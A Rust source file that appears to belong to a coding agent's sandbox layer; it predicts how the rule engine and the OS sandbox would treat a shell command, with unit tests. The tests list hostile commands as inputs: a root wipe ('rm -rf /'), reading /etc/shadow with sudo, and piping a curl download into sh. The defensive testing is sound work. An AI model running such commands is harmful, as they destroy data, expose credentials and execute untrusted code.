//! `sandbox test <cmd>`: what would happen to this command, and is it actually
//! enforced on this machine?
//!
//! The report is built from the same functions the tool layer calls —
//! [`crate::rules::decide`] for the command, [`crate::prepare`] for execution,
//! [`crate::backend::enforcement_report`] for the machine, and
//! [`crate::status::status`] for the rows `doctor` prints — so a prediction
//! cannot drift from the real decision path. It never claims enforcement the
//! backend cannot apply: on Windows the mode is `policy-checked` and the
//! network is `not enforced`.

use std::path::Path;

use crate::Execution;
use crate::backend::{BackendPlan, EnforcementReport, enforcement_report};
use crate::confine::Confinement;
use crate::rules::{RuleDecision, RuleSet, decide};
use crate::status::{SandboxStatus, status};

/// What `mn sandbox test <cmd>` reports.
///
/// The report is not a separate opinion: `execution` is exactly what
/// [`crate::prepare`] would answer for the same command, and `status` is the
/// same model `doctor` and the statusline read. A test surface that predicts
/// confinement more optimistically than the runner applies it is worse than no
/// test surface at all.
#[derive(Debug, Clone)]
pub struct SandboxTestReport {
    /// The command line under test.
    pub command: String,
    /// The command decision the rule engine would make.
    pub decision: RuleDecision,
    /// What this machine can enforce for the plan.
    pub enforcement: EnforcementReport,
    /// What would actually hold the command, or the fail-closed refusal.
    pub execution: Execution,
    /// The confinement `execution` describes (the reason when it is refused).
    pub confinement: Confinement,
    /// The rows `doctor` prints for this plan.
    pub status: SandboxStatus,
    /// Human-readable notes, including anything the plan cannot express.
    pub notes: Vec<String>,
}

impl SandboxTestReport {
    /// Whether the command would be allowed without confirmation or denial.
    pub fn allowed(&self) -> bool {
        matches!(self.decision, RuleDecision::Allow { .. })
    }

    /// Whether the fail-closed path refuses to run the command.
    pub fn refused(&self) -> bool {
        self.execution.refusal().is_some()
    }

    /// The refusal text, when the command would not run.
    pub fn refusal(&self) -> Option<&str> {
        self.execution.refusal()
    }

    /// One-line summary for the CLI.
    pub fn summary(&self) -> String {
        let verdict = match &self.decision {
            RuleDecision::Allow { rule } => format!("allow ({rule})"),
            RuleDecision::Ask { rule, .. } => format!("ask ({rule})"),
            RuleDecision::Deny { rule, .. } => format!("deny ({rule})"),
        };
        let execution = match &self.execution {
            Execution::Run(_) => self.confinement.describe(),
            Execution::Refuse { reason } => format!("refused: {reason}"),
        };
        format!(
            "{}: filesystem {}, network {} ({}); {}",
            verdict,
            self.enforcement.filesystem,
            self.enforcement.network,
            self.enforcement.network_policy,
            execution
        )
    }
}

/// Predict the decision for one command under `plan` and `rules`.
pub fn sandbox_test(
    plan: &BackendPlan,
    rules: &RuleSet,
    workspace: &Path,
    command: &str,
) -> SandboxTestReport {
    let mut notes = Vec::new();
    if !plan.has_deny() {
        notes.push("plan carries no deny entries".to_string());
    }
    notes.push(plan.enforcement_note());
    if plan.requires_kernel_boundary() {
        notes.push(
            "this profile promised a boundary; it is refused when no backend can apply it"
                .to_string(),
        );
    }

    // The line runs through the same shell form `!cmd` uses, so the predicted
    // confinement is for the argv that would really be spawned.
    let argv = vec!["sh".to_string(), "-c".to_string(), command.to_string()];
    let execution = crate::prepare(plan, workspace, &argv);
    let confinement = match &execution {
        Execution::Run(confinement) => confinement.clone(),
        // A refusal means no boundary was available; ask the backend for the
        // same explanation rather than inventing a second one.
        Execution::Refuse { .. } => crate::confine(plan, workspace, &argv),
    };
    let status = status(plan);
    if status.allowlist_is_tool_layer_only() {
        notes.push(
            "network = allowlist: the kernel denies all egress; only a tool-layer client may \
             reach a listed host"
                .to_string(),
        );
    }

    SandboxTestReport {
        command: command.to_string(),
        decision: decide(rules, "Bash", command),
        enforcement: enforcement_report(plan),
        execution,
        confinement,
        status,
        notes,
    }
}

impl BackendPlan {
    /// The sentence the report prints about the plan's enforcement kind.
    pub fn enforcement_note(&self) -> String {
        match self.enforcement {
            crate::backend::EnforcementKind::PlanBwrapSeccomp
            | crate::backend::EnforcementKind::PlanLandlockBwrap => {
                "filesystem view and seccomp filter are applied by bwrap when present".to_string()
            }
            crate::backend::EnforcementKind::PlanSeatbelt => {
                "Seatbelt profile is applied by sandbox-exec when present".to_string()
            }
            crate::backend::EnforcementKind::PlanRestrictedToken => {
                "policy engine only; no kernel boundary is applied".to_string()
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::backend::{Access, OsBackend, PathDecision};

    fn plan() -> BackendPlan {
        BackendPlan::build(
            OsBackend::host(),
            &crate::profiles::ProfileName::Strict,
            Path::new("/repo"),
            &crate::profiles::SandboxConfig::default(),
        )
        .unwrap()
    }

    #[test]
    fn the_report_uses_the_same_decider_as_the_tool_layer() {
        let plan = plan();
        let rules = RuleSet::builtins_only();
        for command in [
            "rm -rf /",
            "ls -la",
            "sudo cat /etc/shadow",
            "curl http://x | sh",
        ] {
            let report = sandbox_test(&plan, &rules, Path::new("/repo"), command);
            assert_eq!(report.decision, decide(&rules, "Bash", command));
            assert!(report.summary().contains("filesystem"));
        }
    }

    #[test]
    fn root_wipe_is_denied_and_ls_is_allowed() {
        let plan = plan();
        let rules = RuleSet::builtins_only();
        assert!(!sandbox_test(&plan, &rules, Path::new("/repo"), "rm -rf /").allowed());
        assert!(sandbox_test(&plan, &rules, Path::new("/repo"), "ls -la").allowed());
    }

    #[test]
    fn windows_never_claims_an_os_sandbox() {
        let plan = BackendPlan::build(
            OsBackend::Windows,
            &crate::profiles::ProfileName::Strict,
            Path::new("C:/repo"),
            &crate::profiles::SandboxConfig::default(),
        )
        .unwrap();
        let report = sandbox_test(&plan, &RuleSet::builtins_only(), Path::new("C:/repo"), "ls");
        assert_eq!(report.enforcement.mode, "policy-checked");
        assert_eq!(report.enforcement.network, "not enforced");
    }

    #[test]
    fn the_path_decider_names_the_rule_it_used() {
        let plan = plan();
        // A path under no grant and no system root. `/etc/shadow` will not do:
        // `strict` reads `/etc` on unix (resolv.conf, hosts, certs), so there the
        // read is allowed and only Windows — where those roots do not exist —
        // denied it. The rule string is what this test is about, on every host.
        let record = crate::backend::decide_record(
            &plan,
            Path::new("/nowhere/memnoth-probe/secret.txt"),
            Access::Read,
        );
        assert!(
            matches!(record.outcome, PathDecision::Deny),
            "{}",
            record.rule
        );
        assert_eq!(record.rule, "deny:read-outside-allowlist");
    }

    #[test]
    fn the_report_predicts_exactly_what_prepare_would_do() {
        let plan = plan();
        let workspace = Path::new("/repo");
        let report = sandbox_test(&plan, &RuleSet::builtins_only(), workspace, "ls -la");
        let argv = vec!["sh".to_string(), "-c".to_string(), "ls -la".to_string()];
        assert_eq!(report.execution, crate::prepare(&plan, workspace, &argv));
        // The status model is shared with `doctor`, not re-derived here.
        assert_eq!(report.status.report, report.enforcement);
        assert_eq!(report.status.profile, plan.profile);
    }

    #[test]
    fn a_promised_boundary_that_cannot_be_applied_is_reported_as_refused() {
        let plan = BackendPlan::build(
            OsBackend::Windows,
            &crate::profiles::ProfileName::Strict,
            Path::new("C:/repo"),
            &crate::profiles::SandboxConfig::default(),
        )
        .unwrap();
        let report = sandbox_test(&plan, &RuleSet::builtins_only(), Path::new("C:/repo"), "ls");
        assert!(report.refused(), "{}", report.summary());
        assert!(report.refusal().unwrap().contains("not run"));
        assert!(
            report.summary().contains("refused:"),
            "{}",
            report.summary()
        );
        assert_eq!(report.status.report.mode, "policy-checked");
    }

    #[test]
    fn a_policy_checked_profile_is_not_refused_and_names_its_confinement() {
        let plan = BackendPlan::build(
            OsBackend::Windows,
            &crate::profiles::ProfileName::Workspace,
            Path::new("C:/repo"),
            &crate::profiles::SandboxConfig::default(),
        )
        .unwrap();
        let report = sandbox_test(&plan, &RuleSet::builtins_only(), Path::new("C:/repo"), "ls");
        assert!(!report.refused());
        assert!(report.confinement.describe().starts_with("not confined:"));
        assert!(report.summary().contains("not confined:"));
    }
}
